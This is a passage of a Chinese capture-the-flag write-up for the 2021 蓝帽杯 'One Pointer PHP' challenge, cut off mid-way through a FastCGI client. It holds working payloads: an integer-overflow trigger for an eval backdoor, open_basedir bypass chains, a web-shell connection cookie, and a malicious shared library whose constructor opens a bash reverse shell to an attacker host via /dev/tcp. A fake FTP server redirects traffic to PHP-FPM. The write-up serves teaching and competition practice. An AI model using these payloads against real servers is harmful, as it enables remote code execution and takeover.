        <content type="html"><![CDATA[<h1 id="2021-蓝帽杯-One-Pointer-PHP"><a href="#2021-蓝帽杯-One-Pointer-PHP" class="headerlink" title="[2021 蓝帽杯] One Pointer PHP"></a>[2021 蓝帽杯] One Pointer PHP</h1><h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><h3 id="1-php数组溢出"><a href="#1-php数组溢出" class="headerlink" title="1.php数组溢出"></a>1.php数组溢出</h3><pre class=" language-info"><code class="language-info">32位系统 最大整数  => 231 => 2,147,483,648 - 1 => 2,147,483,647</code></pre><pre class=" language-info"><code class="language-info">64位系统 最大整数  => 263 => 9,223,372,036,854,775,808 - 1  => 9,223,372,036,854,775,807</code></pre><p>如果超出整型范围则解析为浮点型。 </p><span id="more"></span><h3 id="2-a-的赋值特性"><a href="#2-a-的赋值特性" class="headerlink" title="2.$a[]的赋值特性"></a>2.$a[]的赋值特性</h3><p><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(1).png"><br>如果我们赋值给<code>$a[100]=2</code>,则<code>$a[]=3;</code>默认为<code>$a[101]=3</code><br>即赋值给下一个索引值。</p><h4 id="示例1"><a href="#示例1" class="headerlink" title="#示例1"></a>#示例1</h4><pre class=" language-info"><code class="language-info"><?php$count[]=100000000000000000000000;   // 只要大于9,223,372,036,854,775,807就能返回`yes`if($count[]=1){    echo "yes";}// 输出yes</code></pre><h3 id="3-Bypass-open-basedir"><a href="#3-Bypass-open-basedir" class="headerlink" title="3.Bypass open_basedir"></a>3.Bypass open_basedir</h3><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>open_basedir是php.ini的一个配置选项，可以将用户的目录活动范围锁在范围之内。<br>如：活动范围是：<br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(2).png"><br>则<code>/var/www/html/test可访问</code><br>且<code>/var/www不可访问</code><br>即 限制范围的衍生出来的目录可以访问，以内不能访问</p><h4 id="方法一：命令执行函数绕过"><a href="#方法一：命令执行函数绕过" class="headerlink" title="方法一：命令执行函数绕过"></a>方法一：命令执行函数绕过</h4><p>新建3.php文件：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=../index.php");</span></code></pre><p><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(3).png"><br>成功读取文件</p><p>设置了open_basedir后：<br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(4).png"><br>禁止读取文件了，如果用system函数读取呢</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//include("php://filter/read=convert.base64-encode/resource=../index.php");</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"type ..\index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(5).png"></p><h4 id="方法二-glob协议"><a href="#方法二-glob协议" class="headerlink" title="方法二.glob协议"></a>方法二.glob协议</h4><p>用这个代码，访问该文件就可以得到根目录的内容</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> "glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///*";</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将根目录的文件名字输出</span>    <span class="token punctuation">}</span>    <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(6).png"></p><h4 id="方法三-利用ini-set读取文件内容"><a href="#方法三-利用ini-set读取文件内容" class="headerlink" title="方法三.利用ini_set读取文件内容"></a>方法三.利用ini_set读取文件内容</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string">'TES'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'TES'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//一定要有这个var_dump，否则是没有回显的</span><span class="token delimiter">?></span></code></pre><p>成功访问</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(7).png">解题</h2><p>题目给了源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"user.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"backdoor"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span>    <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><h3 id="溢出绕过"><a href="#溢出绕过" class="headerlink" title="溢出绕过"></a>溢出绕过</h3><p>这里要求<code>$count[]=1为假</code><br>即<code>$count[++$user-&gt;count]</code>中的<code>++$user-&gt;count</code>&#x3D;9,223,372,036,854,775,807</p><p>这样子就可以使得$count[]&#x3D;1的序列号为<code>9,223,372,036,854,775,808</code>，溢出了整数最大值，便可以为假<br>成功执行eval一句话木马，试一下phpinfo()<br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(8).png"><br>可以看到phpinfo()；成功执行了<br>注意到phpinfo里面有disable_function<br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(9).png"><br>还有限制目录<br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(2).png"><br>这里有几个方法 可以绕过，我就说两三个：</p><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><h4 id="1-ini-set-的方法"><a href="#1-ini-set-的方法" class="headerlink" title="1.ini_set 的方法"></a>1.ini_set 的方法</h4><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>backdoor<span class="token operator">=</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string">'qf'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'qf'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这段话的简单过程如下：</p><pre class=" language-info"><code class="language-info">mkdir -> 创建新的目录chdir -> 进入目录ini_set('open_basedir','..') -> 设置..为可用的路径chdir(） -> 上一级ini_set('open_basedir','/') -> 设置/为可用的路径scandir  ->  列出指定目录的文件，返回的是arrayprint_r()  -> 打印</code></pre><p><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(10).png"></p><h4 id="2-连接蚁剑，上传文件"><a href="#2-连接蚁剑，上传文件" class="headerlink" title="2.连接蚁剑，上传文件"></a>2.连接蚁剑，上传文件</h4><p>连接的地址是<code>/add_api.php?backdoor=eval($_POST[8]);</code><br>记得添加请求信息的Cookie，值为<code>data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</code><br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(11).png"><br>连接成功<br>上传文件a.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> "glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///*";</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将根目录的文件名字输出</span>    <span class="token punctuation">}</span>    <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>上传成功后，访问即可以得到根目录：<br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(12).png"></p><h4 id="3-利用DirectoryIterator的globa"><a href="#3-利用DirectoryIterator的globa" class="headerlink" title="3.利用DirectoryIterator的globa"></a>3.利用DirectoryIterator的globa</h4><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span>"glob<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///*");</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>直接复制贴在backdoor后面:<br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(13).png"></p><hr><p>开始下一步解题</p><h3 id="分析配置文件"><a href="#分析配置文件" class="headerlink" title="分析配置文件"></a>分析配置文件</h3><p>尝试读取flag：</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>backdoor<span class="token operator">=</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token operator">%</span>27qf<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token operator">%</span>27qf<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token operator">%</span>27open_basedir<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token operator">%</span>27open_basedir<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">/</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">/</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">/</span>flag<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(14).png"><br>返回了False</p><p>看一下本地进程<br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(15).png"></p><p>再看一下fpm的运行端口：</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>backdoor<span class="token operator">=</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'qf'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'/etc/nginx/sites-available/default'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>返回 ：<br><img src="/Blogimages/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(16).png"><br>发现在9001端口<br><code>fastcgi_pass 127.0.0.1:9001;</code>只接受本地的包，如果要利用FastCgi需要利用SSRF</p><h3 id="FPM未授权攻击"><a href="#FPM未授权攻击" class="headerlink" title="FPM未授权攻击"></a>FPM未授权攻击</h3><h4 id="1-构造恶意的so文件"><a href="#1-构造恶意的so文件" class="headerlink" title="1.构造恶意的so文件"></a>1.构造恶意的so文件</h4><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#define _GNU_SOURCE</span><span class="token shell-comment comment">#include </span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stdlib.h</span><span class="token punctuation">></span></span></span><span class="token shell-comment comment">#include </span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stdio.h</span><span class="token punctuation">></span></span></span><span class="token shell-comment comment">#include </span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string.h</span><span class="token punctuation">></span></span></span> <span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> void <span class="token function">preload</span> <span class="token punctuation">(</span>void<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/ip/2333 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//记住这个监听端口，要与下面的保持一致</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//gcc payload.c -fPIC -shared -o payload.so</span></code></pre><p>这个payload.so的名字也要和<code>php脚本</code>对应</p><h4 id="2-构造SSRF"><a href="#2-构造SSRF" class="headerlink" title="2.构造SSRF"></a>2.构造SSRF</h4><p>构造一个文件，file.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">'/tmp/file'</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">':)'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">.</span><span class="token variable">$data</span><span class="token punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>这里的<code>$file = $_GET[&#39;file&#39;] ?? &#39;/tmp/file&#39;;</code><br>??是php7以上的新语法，如果 $_GET[‘file’] 存在，则取 $_GET[‘file’] 的值，若不存在，则取 &#x2F;tmp&#x2F;file<br><code>类似 isset($a)? $a:$b;</code></p><h4 id="3-构造FTP服务器"><a href="#3-构造FTP服务器" class="headerlink" title="3.构造FTP服务器"></a>3.构造FTP服务器</h4><p>都说了是FTP服务器，肯定是得能访问，所以这个要在公网上运行这个脚本（python）</p><pre class=" language-php"><code class="language-php">import sockets <span class="token operator">=</span> socket<span class="token punctuation">.</span><span class="token function">socket</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span><span class="token constant">AF_INET</span><span class="token punctuation">,</span> socket<span class="token punctuation">.</span><span class="token constant">SOCK_STREAM</span><span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token shell-comment comment">#这里是ftp的端口</span>s<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>b<span class="token string">'220 welcome\n'</span><span class="token punctuation">)</span><span class="token shell-comment comment">#Service ready for new user.</span><span class="token shell-comment comment">#Client send anonymous username</span><span class="token shell-comment comment">#USER anonymous</span>conn<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>b<span class="token string">'331 Please specify the password.\n'</span><span class="token punctuation">)</span><span class="token shell-comment comment">#User name okay, need password.</span><span class="token shell-comment comment">#Client send anonymous password.</span><span class="token shell-comment comment">#PASS anonymous</span>conn<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>b<span class="token string">'230 Login successful.\n'</span><span class="token punctuation">)</span><span class="token shell-comment comment">#User logged in, proceed. Logged out if appropriate.</span><span class="token shell-comment comment">#TYPE I</span>conn<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>b<span class="token string">'200 Switching to Binary mode.\n'</span><span class="token punctuation">)</span><span class="token shell-comment comment">#Size /</span>conn<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>b<span class="token string">'550 Could not get the file size.\n'</span><span class="token punctuation">)</span><span class="token shell-comment comment">#EPSV (1)</span>conn<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>b<span class="token string">'150 ok\n'</span><span class="token punctuation">)</span><span class="token shell-comment comment">#PASV</span>conn<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>b<span class="token string">'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n'</span><span class="token punctuation">)</span> <span class="token shell-comment comment">#STOR / (2)  </span>                                                            <span class="token comment" spellcheck="true">// 注意端口</span>conn<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>b<span class="token string">'150 Permission denied.\n'</span><span class="token punctuation">)</span><span class="token shell-comment comment">#QUIT</span>conn<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>b<span class="token string">'221 Goodbye.\n'</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>注意：只要连接到就会退出</p><h4 id="4-构造Fastcgi请求"><a href="#4-构造Fastcgi请求" class="headerlink" title="4.构造Fastcgi请求"></a>4.构造Fastcgi请求</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/** * Note : Code is released under the GNU LGPL * * Please do not change the header of this file * * This library is free software; you can redistribute it and/or modify it under the terms of the GNU * Lesser General Public License as published by the Free Software Foundation; either version 2 of * the License, or (at your option) any later version. * * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. * * See the GNU Lesser General Public License for more details. */</span><span class="token comment" spellcheck="true">/** * Handles communication with a FastCGI application * * @author      Pierrick Charron &lt;pierrick@webstart.fr> * @version     1.0 */</span><span class="token keyword">class</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token constant">VERSION_1</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">BEGIN_REQUEST</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">ABORT_REQUEST</span>        <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">END_REQUEST</span>          <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">PARAMS</span>               <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDIN</span>                <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDOUT</span>               <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">STDERR</span>               <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">DATA</span>                 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES</span>           <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">GET_VALUES_RESULT</span>    <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_TYPE</span>         <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">MAXTYPE</span>              <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">UNKNOWN_TYPE</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">RESPONDER</span>            <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">AUTHORIZER</span>           <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">FILTER</span>               <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">REQUEST_COMPLETE</span>     <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">CANT_MPX_CONN</span>        <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">OVERLOADED</span>           <span class="token 